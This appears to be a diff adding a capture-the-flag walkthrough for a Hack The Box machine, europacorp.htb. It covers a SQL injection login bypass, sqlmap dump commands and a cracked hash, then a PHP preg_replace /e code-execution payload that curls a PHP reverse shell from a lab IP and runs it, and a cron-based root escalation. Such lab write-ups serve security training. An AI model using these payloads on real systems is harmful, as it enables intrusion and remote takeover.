@@ -1,0 +1,55 @@
+1. Did nmap scan noticed to open ports with http and https enabled, looked at https certificates and 
+found following: E = admin@europacorp.htbm CN = europacorp.htb, will change hosts file to map to 
+europacorp.htb.
+
+A few other dns names appeared:
+DNS Name: www.europacorp.htb
+DNS Name: admin-portal.europacorp.htb
+
+Adding them to hosts file
+
+2. Virtual host routing is set in place, got a hist with https://admin-portal.europacorp.htb could use
+hydra to brute force login, or use burp to analyze requests.
+
+admin@europacorp.htb : email to possibly brute force
+
+In burp we conduct a simple sql injectio query to verify if input fields are exploitable: example\
+	email=admin%40europacorp.htb'-- -&password=password
+
+Have to use the admin email address in order to authenticate. It logs us in. 
+Also have to modify requests from inside burp for it to work, since local checks are done in the browser
+intercept and then forward.
+
+3. Next will use sqlmap to enumerate, will use a post request from burp and feed it to sqlmap in order
+for this to work one must first use an authenitcated cookie and use the new cookie inside the login
+request.
+sqlmap -r login.req --dbms mysql -p email --force-ssl
+
+sqlmap -r login.req --dbms mysql -p email --force-ssl --dump
+
+Once the material is dumped you can get the password for the hash that was dumped by going to hashes.org
+2b6d315337f18617ba18922c0b9597ff:SuperSecretPassword!
+
+4. Next once we have successfully logged in using the sql injection, we are able to navigate the entire
+dashboard area. Inside this dashboard area, there is a tools area that we can use to generate an openvpn 
+file however in this generate website there is a php vulnerability wih pcre expression that allows for code execution.
+
+php regular expression danger
+
+pattern=/vtun0/e&ipaddress=system('whoami')&text="openvpn": 
+
+Basically adding a '/e' and now we can execute commands everytime that vtun0 is found.
+
+To get a shell we can have the server download a php reverse shell script and have it execute to
+give us a shell.
+
+pattern=/vtun0/e&ipaddress=system('curl 10.10.14.36/php-reverse-shell.php | php')&text="openvpn": {
+
+Shell is now acquired.
+
+5. After dowloading and running the LinEnum.sh script we can enureate and look for any discrepancies
+Apparently there is a cronjob running that a has php code running every minute in /var/www/cmd/
+logcleared.sh. The file is writeable in that directory so we can now give ourselves a reverse shell as
+root.
+
+
